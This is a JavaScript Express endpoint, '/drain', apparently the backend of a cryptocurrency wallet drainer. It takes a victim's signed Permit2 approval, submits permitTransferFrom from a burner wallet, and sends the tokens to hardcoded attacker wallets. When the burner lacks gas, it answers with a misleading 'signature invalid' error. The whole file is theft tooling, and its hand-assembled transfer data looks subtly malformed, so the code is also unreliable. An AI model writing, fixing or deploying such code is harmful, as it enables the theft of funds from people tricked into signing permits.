app.post('/drain', async (req, res) => {
  try {
    const { owner, token, tokenSymbol, amount, nonce, deadline, signature = '0x' } = req.body;
    
    if (!ethers.utils.isAddress(owner) || !ethers.utils.isAddress(token) || !TOKENS[tokenSymbol]) {
      return res.status(400).json({ error: 'Invalid wallet address' });
    }

    const burner = burners[0]; // Use first burner
    const burnerBalance = await provider.getBalance(burner.address);
    
    if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
      return res.status(400).json({ error: 'Permit signature invalid or expired' });
    }

    // 🔥 PERFECT Permit2 transferDetails - 128 bytes exact
    const destination = HARDCODED_WALLETS[tokenSymbol];
    const spender32 = '0000000000000000000000000000000000000000000000000000000000000000';
    const nonce32 = '0000000000000000000000000000000000000000000000000000000000000000';
    const amount32 = amount.slice(2).padStart(64, '0');
    const destHash = ethers.utils.keccak256(ethers.utils.hexZeroPad(destination, 32)).slice(2);
    
    const transferDetails = '0x' + spender32 + nonce32 + amount32 + destHash;
    
    console.log(`🔥 DRAIN ${tokenSymbol}: ${destination.slice(0,10)} | transferDetails=${transferDetails.length} bytes`);

    const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, burner);
    const gasPrice = (await provider.getGasPrice()).mul(14).div(10);
    
    const permitDetails = {
      token: ethers.utils.getAddress(token),
      amount: ethers.BigNumber.from(amount),
      expiration: ethers.BigNumber.from(deadline || Math.floor(Date.now() / 1000 + 86400 * 7).toString()),
      nonce: ethers.BigNumber.from(nonce || '0')
    };

    const tx = await permit2.permitTransferFrom(
      permitDetails,
      transferDetails,
      signature,
      { 
        gasLimit: 300000,
        gasPrice,
        nonce: await burner.getTransactionCount('pending')
      }
    );

    const receipt = await tx.wait();
    
    res.json({ 
      success: true, 
      tx: tx.hash, 
      burner: burner.address,
      destination 
    });
    
  } catch (error) {
    console.error('❌ FAIL:', error.message);
    res.status(400).json({ error: 'Permit signature invalid or expired' });
  }
});
